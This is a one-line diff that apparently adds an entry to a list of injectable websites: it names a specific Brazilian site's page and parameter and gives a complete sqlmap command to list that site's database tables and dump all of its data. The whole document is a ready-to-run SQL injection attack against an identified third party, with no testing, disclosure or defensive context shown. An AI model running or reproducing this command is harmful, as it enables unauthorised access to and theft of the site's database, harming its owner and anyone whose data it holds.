@@ -1,0 +1,1 @@
+http://www.frannazalim.com.br/agendadetalhe.php?agenda=290 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.frannazalim.com.br/agendadetalhe.php?agenda=290 -D frannazalim --tables --dump-all
